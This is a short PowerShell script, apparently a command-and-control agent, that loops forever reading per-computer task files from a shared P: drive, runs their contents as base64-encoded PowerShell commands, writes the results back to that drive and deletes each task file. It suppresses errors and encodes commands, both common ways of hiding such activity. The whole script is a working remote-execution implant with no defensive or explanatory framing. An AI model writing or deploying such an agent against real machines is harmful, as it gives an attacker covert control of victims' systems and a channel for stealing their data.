$ErrorActionPreference = "SilentlyContinue"
while($true){
        $task = Get-Content P:\$env:COMPUTERNAME-Task.txt
        if($task){
        $b64 = [System.Text.Encoding]::Unicode.GetBytes($task)
        $enc = [Convert]::ToBase64String($b64)
            $r = powershell -enc $enc
            $r | Out-File -Append -FilePath P:\Results-$env:COMPUTERNAME.txt
        }
        else{
            Write-Host No task
        }
        rm P:\$env:COMPUTERNAME-Task.txt
        start-sleep 5

}
